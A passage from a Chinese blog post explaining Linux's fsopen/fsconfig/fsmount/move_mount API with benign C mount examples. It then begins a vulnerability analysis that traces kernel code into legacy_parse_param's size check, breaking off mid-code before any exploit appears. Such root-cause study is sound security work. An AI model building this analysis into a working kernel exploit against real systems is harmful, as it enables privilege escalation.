class="line">param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里主要关注这一个分支，在分支中设置完<code>param</code>之后进入后续流程，最终进入到<code>vfs_fsconfig_locked</code>函数进行处理。</p><h3 id="fsmount"><a href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h3><p>完成了文件系统上下文的创建与配置，接下来终于来到文件系统的挂载操作了，<code>fsmount()</code> 系统调用用以获取一个可以被用以进行挂载的挂载实例，并返回一个文件描述符用以下一步的挂载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h3><p>最后使用<code>move_mount</code>系统调用将挂载实例在挂载点之间移动，对于尚未进行挂载的挂载实例而言，进行挂载的操作便是从空挂载点 <code>&quot;&quot;</code> 移动到对应的挂载点（例如 <code>&quot;/mnt/temp&quot;</code>），此时我们并不需要给出目的挂载点的 fd，而可以使用 <code>AT_FDCWD</code>，引入了 <code>move_mount()</code> 之后，我们最终的一个用以将 <code>&quot;/dev/sdb1&quot;</code> 以 <code>&quot;ext4&quot;</code> 文件系统挂载到 <code>&quot;/mnt/temp&quot;</code> 的完整示例程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_move_mount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_mount 429</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_mount</span><span class="params">(<span class="keyword">int</span> from_dfd, <span class="keyword">const</span> <span class="keyword">char</span> *from_pathname,<span class="keyword">int</span> to_dfd, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">const</span> <span class="keyword">char</span> *to_pathname, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line">    move_mount(mount_fd, <span class="string">&quot;&quot;</span>, AT_FDCWD, <span class="string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>这里介绍几乎就是照抄a3和知乎的文章</del></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>前面提到在<code>fsconfig</code>函数中，最终会调用<code>vfs_fsconfig_locked</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vfs_fsconfig_locked</span><span class="params">(struct fs_context *fc, <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = finish_clean_context(fc);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!mount_capable(fc))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_CREATING;</span><br><span class="line">ret = vfs_get_tree(fc);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">ret = security_sb_kern_mount(sb);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret)) &#123;</span><br><span class="line">fc_drop_locked(fc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">up_write(&amp;sb-&gt;s_umount);</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_RECONFIGURING;</span><br><span class="line">sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line"><span class="keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">down_write(&amp;sb-&gt;s_umount);</span><br><span class="line">ret = reconfigure_super(fc);</span><br><span class="line">up_write(&amp;sb-&gt;s_umount);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">vfs_clean_context(fc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;</span><br><span class="line">    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> vfs_parse_fs_param(fc, param);</span><br><span class="line">&#125;</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_FAILED;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上述函数中依旧是根据cmd进入不同的swith分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fsconfig_command</span> &#123;</span></span><br><span class="line">FSCONFIG_SET_FLAG= <span class="number">0</span>,<span class="comment">/* Set parameter, supplying no value */</span></span><br><span class="line">FSCONFIG_SET_STRING= <span class="number">1</span>,<span class="comment">/* Set parameter, supplying a string value */</span></span><br><span class="line">FSCONFIG_SET_BINARY= <span class="number">2</span>,<span class="comment">/* Set parameter, supplying a binary blob value */</span></span><br><span class="line">FSCONFIG_SET_PATH= <span class="number">3</span>,<span class="comment">/* Set parameter, supplying an object by path */</span></span><br><span class="line">FSCONFIG_SET_PATH_EMPTY= <span class="number">4</span>,<span class="comment">/* Set parameter, supplying an object by (empty) path */</span></span><br><span class="line">FSCONFIG_SET_FD= <span class="number">5</span>,<span class="comment">/* Set parameter, supplying an object by fd */</span></span><br><span class="line">FSCONFIG_CMD_CREATE= <span class="number">6</span>,<span class="comment">/* Invoke superblock creation */</span></span><br><span class="line">FSCONFIG_CMD_RECONFIGURE = <span class="number">7</span>,<span class="comment">/* Invoke superblock reconfiguration */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据定义，最终会进入到<code>default</code>分支中，最终会调用<code>vfs_parse_fs_param</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_parse_fs_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!param-&gt;key)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;Unnamed parameter\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">ret = vfs_parse_sb_flag(fc, param-&gt;key);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">ret = security_fs_context_parse_param(fc, param);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span></span><br><span class="line"><span class="comment"> * don&#x27;t pass to the FS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">ret = fc-&gt;ops-&gt;parse_param(fc, param);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span></span><br><span class="line"><span class="comment"> * default handling of source.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Non-string source&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Multiple sources&quot;</span>);</span><br><span class="line">fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">      fc-&gt;fs_type-&gt;name, param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_parse_fs_param);</span><br></pre></td></tr></table></figure><p>而在此函数中会调用到<code>fs_context-&gt;ops-&gt;parse_param</code>，接着根据前面在<code>legacy_init_fs_context</code>函数中会对<code>fs_context-&gt;ops</code>赋值为<code>legacy_fs_context_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> <span class="title">legacy_fs_context_ops</span> =</span> &#123;</span><br><span class="line">.<span class="built_in">free</span>= legacy_fs_context_free,</span><br><span class="line">.dup= legacy_fs_context_dup,</span><br><span class="line">.parse_param= legacy_parse_param,</span><br><span class="line">.parse_monolithic= legacy_parse_monolithic,</span><br><span class="line">.get_tree= legacy_get_tree,</span><br><span class="line">.reconfigure= legacy_reconfigure,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据前面所述，最终会调用到<code>legacy_parse_param</code>函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> *<span class="title">ctx</span> =</span> fc-&gt;fs_private;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size = ctx-&gt;data_size;</span><br><span class="line"><span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Non-string source&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Multiple sources&quot;</span>);</span><br><span class="line">fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (param-&gt;type) &#123;</span><br><span class="line"><span class="keyword">case</span> fs_value_is_string:</span><br><span class="line">len = <span class="number">1</span> + param-&gt;size;</span><br><span class="line"><span class="comment">/* Fall through */</span></span><br><span class="line"><span class="keyword">case</span> fs_value_is_flag:</span><br><span class="line">len += <span class="built_in">strlen</span>(param-&gt;key);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,</span><br><span class="line">      param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">    (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">     <span class="built_in">memchr</span>(param-&gt;<span class="built_in">string</span>, <span class="string">&#x27;,&#x27;</span>, param-&gt;size)))</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,</span><br><span class="line">      param-&gt;key);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;legacy_data) &#123;</span><br><span class="line">ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;legacy_data)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;legacy_data[size++] = <span 